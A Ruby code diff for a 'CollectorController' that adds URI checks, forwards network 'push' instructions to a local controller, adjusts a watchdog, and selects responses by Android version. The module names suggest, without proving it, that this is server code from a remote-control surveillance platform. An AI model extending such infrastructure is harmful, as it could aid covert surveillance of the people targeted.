@@ -1,4 +1,4 @@
-require_relative 'protocol'
+require_relative 'sync_protocol'
 
 require 'rcs-common/mime'
 
@@ -14,6 +14,8 @@ module Collector
 class CollectorController < RESTController
   
   def get
+    return bad_request unless @request[:uri].start_with?('/')
+
     # serve the requested file
     return http_get_file(@request[:headers], @request[:uri])
   rescue Exception => e
@@ -22,6 +24,8 @@ class CollectorController < RESTController
   end
 
   def head
+    return bad_request unless @request[:uri].start_with?('/')
+
     trace :info, "[#{@request[:peer]}] HEAD public request #{@request[:uri]}"
     # serve the requested file
     return http_get_file(@request[:headers], @request[:uri], false)
@@ -37,9 +41,22 @@ class CollectorController < RESTController
       return method_not_allowed
     end
 
-    # it is a request to push to a NC element
-    content, content_type = NetworkController.push(@request[:uri], @request[:content])
-    return ok(content, {content_type: content_type})
+    # Forward to rcs-controller
+    trace(:debug, "Sending push instruction to the controller...")
+
+    controller_srv_port = Config.instance.global['CONTROLLER_PORT']
+    http = Net::HTTP.new("127.0.0.1", controller_srv_port)
+    # see the timeout around #check_element in rcs-controller
+    http.read_timeout = Config.instance.global['NC_INTERVAL'] - 2
+    resp = http.send_request('PUSH', '/', @request[:uri], {})
+
+    if resp.body == 'OK'
+      trace(:debug, "Network push succeed!")
+    else
+      trace(:error, "Network push failed: [#{resp.code}] #{resp.body}")
+    end
+
+    ok(resp.body, content_type: "text/html")
   end
 
   def put
@@ -76,8 +93,9 @@ class CollectorController < RESTController
 
   def watchdog
     trace :debug, "#{@request[:peer]} watchdog #{$watchdog.locked?} [#{@request[:uri]}]"
+    @request[:uri].gsub!("/", '')
     return ok("#{$external_address} #{DB.instance.check_signature}", {content_type: "text/html"}) if @request[:uri].eql? 'CHECK'
-    return bad_request if @request[:uri] != @request[:peer]
+    return method_not_allowed if @request[:uri] != @request[:peer]
     return ok("#{$version}", {content_type: "text/html"}) if $watchdog.lock
   end
 
@@ -290,8 +308,8 @@ class CollectorController < RESTController
       major, minor = ver_tuple unless ver_tuple.empty?
       if major.to_i == 2
         version = 'v2'
-      elsif major.to_i == 4 and minor.to_i >= 2
-        version = 'jelly'
+      elsif major.to_i == 4 and minor.to_i >= 4
+        version = 'kitkat'
       else
         version = 'default'
       end
